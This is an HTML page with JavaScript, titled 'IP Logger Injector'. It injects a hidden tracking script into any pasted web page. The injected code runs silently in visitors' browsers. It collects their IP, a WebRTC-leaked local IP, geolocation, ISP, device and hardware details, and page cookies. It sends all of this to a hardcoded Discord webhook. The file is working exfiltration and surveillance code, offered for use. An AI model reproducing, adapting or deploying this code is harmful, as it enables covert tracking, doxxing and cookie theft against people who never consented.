<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Logger Injector</title>
    <style>
        body{background:#0a0e27;font-family:monospace;padding:20px}
        .container{max-width:1600px;margin:0 auto}
        .toolbar{background:#1a1f3a;padding:15px 20px;border-radius:8px;margin-bottom:20px;display:flex;gap:15px;flex-wrap:wrap}
        .toolbar input{background:#0d0f23;border:1px solid #2a2f4f;color:white;padding:8px 15px;border-radius:6px;width:300px}
        button{background:#4a3ab5;color:white;border:none;padding:8px 20px;border-radius:6px;cursor:pointer}
        .copy-btn{background:#2a5f3a}
        .editor-area{display:grid;grid-template-columns:1fr 1fr;gap:20px}
        .panel{background:#11152f;border-radius:8px;border:1px solid #2a2f4f}
        .panel-header{background:#1a1f3a;padding:12px 15px;border-bottom:1px solid #2a2f4f}
        textarea{width:100%;height:550px;background:#0d0f23;border:none;color:#b8c7ff;font-family:monospace;font-size:12px;padding:15px;resize:vertical;outline:none}
        #outputHtml{background:#0a0c1f}
        .status{margin-top:15px;padding:10px;border-radius:6px;display:none}
        .status.success{background:#1a3a2a;color:#6fcf97;display:block}
        .status.error{background:#3a1a1a;color:#e74c3c;display:block}
        .webhook-info{background:#1a1f3a;padding:10px 15px;border-radius:6px;margin-top:20px;font-size:12px}
    </style>
</head>
<body>
<div class="container">
    <div class="toolbar">
        <label>LABEL:</label>
        <input type="text" id="labelInput" value="Kiosk_Main">
        <button id="injectBtn">INJECT</button>
        <button id="copyBtn" class="copy-btn">COPY</button>
    </div>
    <div class="editor-area">
        <div class="panel">
            <div class="panel-header">INPUT HTML</div>
            <textarea id="inputHtml" placeholder='Paste HTML here...'></textarea>
        </div>
        <div class="panel">
            <div class="panel-header">OUTPUT (COPY THIS)</div>
            <textarea id="outputHtml" placeholder="Click INJECT..." readonly style="background:#0a0c1f;"></textarea>
        </div>
    </div>
    <div id="statusMsg" class="status"></div>
    <div class="webhook-info">
        Webhook Active | Tracks: IP • Geolocation • ISP • ASN • VPN • Mobile • Device • Screen • CPU • RAM • Battery • Connection • Plugins • WebRTC • Cookies • Storage
    </div>
</div>

<script>
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1499088458407219200/2K55GD94Hb9UDxfsBk-ZVF__9z-Bc2Qv1dg-H94f89pRoU5jq4jNpyyPQ5s7D1z5vyds';

function getTrackerScript(label) {
    let cleanLabel = label.replace(/\\/g,'\\\\').replace(/`/g,'\\`').replace(/\$/g,'\\$').replace(/"/g,'\\"');
    return '\n<script>\n(function(){\nconst L="'+cleanLabel+'";const W="'+WEBHOOK_URL+'";const TS=new Date().toISOString();const U=location.href;const T=document.title;const R=document.referrer||"Direct";\nasync function getWebRTC(){return new Promise((r)=>{let pc=new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});pc.createDataChannel("");pc.createOffer().then(o=>pc.setLocalDescription(o));pc.onicecandidate=(e)=>{if(e&&e.candidate){let ip=e.candidate.candidate.match(/([0-9]{1,3}\\.){3}[0-9]{1,3}/);if(ip){r(ip[0]);pc.close()}}};setTimeout(()=>r("unavailable"),2000)});}\nasync function getData(){try{\nlet geo=await fetch("https://ipapi.co/json/").then(r=>r.json());\nlet webrtcIP=await getWebRTC();\nlet batteryInfo="unavailable";\nif(navigator.getBattery){try{let b=await navigator.getBattery();batteryInfo=(b.charging?"Charging ":"")+Math.round(b.level*100)+"%" }catch(e){}}\nlet conn=navigator.connection||navigator.mozConnection||navigator.webkitConnection;\nlet connectionInfo=conn?conn.effectiveType+"("+conn.rtt+"ms)":"unavailable";\nlet plugins=[];for(let i=0;i<navigator.plugins.length&&i<8;i++){plugins.push(navigator.plugins[i].name);}\nlet payload={\nlabel:L,ts:TS,url:U,title:T,referrer:R,\nip:geo.ip||"unknown",webrtc:webrtcIP,\ncity:geo.city||"unknown",region:geo.region||"unknown",region_code:geo.region_code||"unknown",postal:geo.postal||"unknown",\ncountry:geo.country_name||"unknown",country_code:geo.country_code||"unknown",lat:geo.latitude||"unknown",lon:geo.longitude||"unknown",\nisp:geo.org||"unknown",asn:geo.asn||"unknown",vpn:geo.proxy||false,mobile:geo.mobile||false,carrier:geo.carrier||"unknown",\ncurrency:geo.currency||"unknown",calling_code:geo.country_calling_code||"unknown",timezone:geo.timezone||Intl.DateTimeFormat().resolvedOptions().timeZone,\nua:navigator.userAgent,platform:navigator.platform,language:navigator.language,languages:navigator.languages.join(", "),\nscreen:screen.width+"x"+screen.height,screen_avail:screen.availWidth+"x"+screen.availHeight,color_depth:screen.colorDepth+"bit",pixel_ratio:window.devicePixelRatio,\nhardware_concurrency:navigator.hardwareConcurrency||"unknown",device_memory:navigator.deviceMemory?navigator.deviceMemory+"GB":"unknown",max_touch_points:navigator.maxTouchPoints,\ncookie_enabled:navigator.cookieEnabled,do_not_track:navigator.doNotTrack||"unspecified",connection:connectionInfo,battery:batteryInfo,plugins:plugins.join(", "),\nlocal_storage:(()=>{try{return Object.keys(localStorage).length}catch(e){return"blocked"}})(),\nsession_storage:(()=>{try{return Object.keys(sessionStorage).length}catch(e){return"blocked"}})(),\ncookies:document.cookie?document.cookie.substring(0,200):"none"\n};\nlet fields=[\n{name:"IP",value:payload.ip+(payload.webrtc!="unavailable"?" (WebRTC:"+payload.webrtc+")":""),inline:false},\n{name:"ISP/ASN",value:payload.isp+(payload.asn!="unknown"?"\\nASN:"+payload.asn:""),inline:true},\n{name:"VPN/Proxy",value:payload.vpn?"YES":"NO",inline:true},\n{name:"Mobile/Carrier",value:payload.mobile?payload.carrier||"Detected":"No",inline:true},\n{name:"Location",value:payload.city+", "+payload.region+" ("+payload.region_code+")\\n"+payload.country+" ("+payload.country_code+")\\nPostal:"+payload.postal,inline:false},\n{name:"Coords",value:payload.lat+", "+payload.lon,inline:true},\n{name:"Currency/Calling",value:payload.currency+"/"+payload.calling_code,inline:true},\n{name:"Device",value:payload.ua.substring(0,70),inline:false},\n{name:"Platform",value:payload.platform,inline:true},\n{name:"Language",value:payload.language+" ("+payload.languages+")",inline:false},\n{name:"Screen",value:payload.screen+" (avail:"+payload.screen_avail+")\\nColor:"+payload.color_depth+" Ratio:"+payload.pixel_ratio,inline:false},\n{name:"Hardware",value:"CPU:"+payload.hardware_concurrency+" cores RAM:"+payload.device_memory+" Touch:"+payload.max_touch_points,inline:false},\n{name:"Connection/Battery",value:"Net:"+payload.connection+" Bat:"+payload.battery,inline:false},\n{name:"Plugins",value:payload.plugins||"none",inline:false},\n{name:"Storage",value:"Local:"+payload.local_storage+" Session:"+payload.session_storage,inline:true},\n{name:"Cookies",value:payload.cookies,inline:false},\n{name:"Page",value:payload.url.substring(0,100),inline:false},\n{name:"Label",value:payload.label,inline:true},\n{name:"Time",value:payload.ts,inline:true}\n];\nawait fetch(W,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({embeds:[{title:"VISITOR - "+payload.label,color:0xff4444,fields:fields}]})});\n}catch(e){console.error(e);}\n}\ngetData();\n})();\n<\/script>\n';
}

function injectScript(html, label) {
    if(!html||html.trim()==="") throw new Error("Paste HTML first");
    if(!label||label.trim()==="") throw new Error("Enter label");
    let scriptBlock = getTrackerScript(label.trim());
    if(html.indexOf('</body>') > -1) return html.replace('</body>', scriptBlock + '\n</body>');
    if(html.indexOf('</html>') > -1) return html.replace('</html>', scriptBlock + '\n</html>');
    return html + '\n' + scriptBlock;
}

const inputArea = document.getElementById('inputHtml');
const outputArea = document.getElementById('outputHtml');
const labelInput = document.getElementById('labelInput');
const injectBtn = document.getElementById('injectBtn');
const copyBtn = document.getElementById('copyBtn');
const statusDiv = document.getElementById('statusMsg');

inputArea.value = '<!DOCTYPE html>\n<html>\n<head>\n    <title>Test Page</title>\n</head>\n<body>\n    <h1>Hello</h1>\n</body>\n</html>';

injectBtn.onclick = () => {
    try {
        let result = injectScript(inputArea.value, labelInput.value);
        outputArea.value = result;
        statusDiv.className = 'status success';
        statusDiv.textContent = '✅ INJECTED!';
        statusDiv.style.display = 'block';
        setTimeout(()=>statusDiv.style.display='none',3000);
    } catch(err) {
        statusDiv.className = 'status error';
        statusDiv.textContent = '❌ '+err.message;
        statusDiv.style.display = 'block';
        setTimeout(()=>statusDiv.style.display='none',3000);
    }
};

copyBtn.onclick = async () => {
    let code = outputArea.value;
    if(!code||code==="Click INJECT to generate tracked HTML...") {
        statusDiv.className = 'status error';
        statusDiv.textContent = '❌ Nothing to copy';
        statusDiv.style.display = 'block';
        setTimeout(()=>statusDiv.style.display='none',2000);
        return;
    }
    try {
        await navigator.clipboard.writeText(code);
        statusDiv.className = 'status success';
        statusDiv.textContent = '📋 COPIED!';
        statusDiv.style.display = 'block';
        setTimeout(()=>statusDiv.style.display='none',2000);
    } catch(err) {
        outputArea.select();
        document.execCommand('copy');
        statusDiv.className = 'status success';
        statusDiv.textContent = '📋 COPIED!';
        statusDiv.style.display = 'block';
        setTimeout(()=>statusDiv.style.display='none',2000);
    }
};
</script>
</body>
</html>
